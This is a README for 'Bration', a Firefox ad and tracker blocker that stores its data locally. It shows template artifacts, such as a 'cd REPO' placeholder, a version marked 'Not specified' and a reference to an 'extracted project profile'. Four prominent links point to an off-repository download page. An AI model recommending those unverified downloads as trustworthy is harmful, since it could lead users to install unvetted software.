# Bration - Browser Ad Blocker 2026

> **Bration is a Firefox extension that blocks ads and trackers at the network layer, removes selected page elements, suppresses popups, and helps prevent unwanted redirects. Its data remains on the local device.**

[![Platform](https://img.shields.io/badge/Platform-Firefox-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/nathan-fisherxrgx1255/bration-browser-adblocker?style=flat-square)](https://github.com/nathan-fisherxrgx1255/bration-browser-adblocker)

---

<p align="center">
  <a href="https://nathan-fisherxrgx1255.github.io/bration-browser-adblocker/">
    <img src="https://img.shields.io/badge/Download-Bration%20Latest-brightgreen?style=for-the-badge" alt="Download Bration">
  </a>
</p>

> **[Download Bration](https://nathan-fisherxrgx1255.github.io/bration-browser-adblocker/)**

---

[Download Latest Build](https://nathan-fisherxrgx1255.github.io/bration-browser-adblocker/)

---

## What Bration Does

Bration helps make Firefox browsing less disruptive by filtering advertising and tracking requests, blocking popups, and guarding against forced redirects. Network-level filtering works alongside cosmetic filtering to improve the appearance of supported pages.

The extension also provides controls that can be set per website and includes a dashboard for examining up to 30 days of browsing history. Bration keeps information locally rather than collecting it, and its filtering design uses Brave adblock-rust compiled to WebAssembly.

---

## Capabilities

- Blocks advertising and tracker requests at the network level
- Filters unwanted elements from web pages
- Prevents popups
- Helps stop forced redirects
- Offers site-specific blocking controls
- Provides a browsing history dashboard covering 30 days
- Keeps stored data on the local device
- Collects no data
- Uses a Firefox extension design with WebAssembly support

---

## Installing Bration

### Download a Build

Get the current Bration build here:

[Download Bration](https://nathan-fisherxrgx1255.github.io/bration-browser-adblocker/)

### Build from the Repository

Check out the source repository and enter its directory:

    git clone https://github.com/nathan-fisherxrgx1255/bration-browser-adblocker.git
    cd REPO

Use the project files included in the repository to build or package the extension. Once the output is ready, load it in Firefox using the browser's extension management tools.

When testing during development, use Firefox's temporary extension loader and choose either the extension package or the directory containing its manifest.

---

## Using the Extension

1. Start Firefox once Bration has been installed or loaded.
2. Browse as usual while the extension performs network and cosmetic filtering.
3. Open Bration's controls to change blocking behavior for the site you are visiting.
4. Consult the 30-day history dashboard to review recent activity.
5. Modify per-site settings whenever a website needs a different blocking configuration.

---

## Settings and Local Data

Bration manages its working data on the local device. Its extension interface is used to configure per-site blocking and other available filtering preferences.

The extension does not need an external data store for its local configuration or dashboard information.

---

## System Requirements

- Firefox
- A Firefox installation that supports browser extensions
- WebAssembly support for the filtering engine
- Local storage capacity for extension settings and the 30-day history dashboard

---

## Frequently Asked Questions

### What browser is supported?

Bration is built for Firefox.

### Does the extension gather browsing information?

The extracted project profile describes local-only storage and zero data collection. Refer to the repository documentation and license for the full project terms.

### Can I configure blocking by website?

Yes. Blocking behavior can be controlled separately for individual sites.

### How much history can the dashboard show?

Bration includes a dashboard for up to 30 days of browsing history.

### How can I get a newer version?

Use the latest build link, or follow the repository's current process for updating a Firefox extension.

### What can I do if Firefox will not load the extension?

First verify that the extension is being loaded in Firefox and that the chosen package or manifest directory is complete. Also check that the required WebAssembly resources are present. If loading still fails, review the project documentation and issue tracker.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
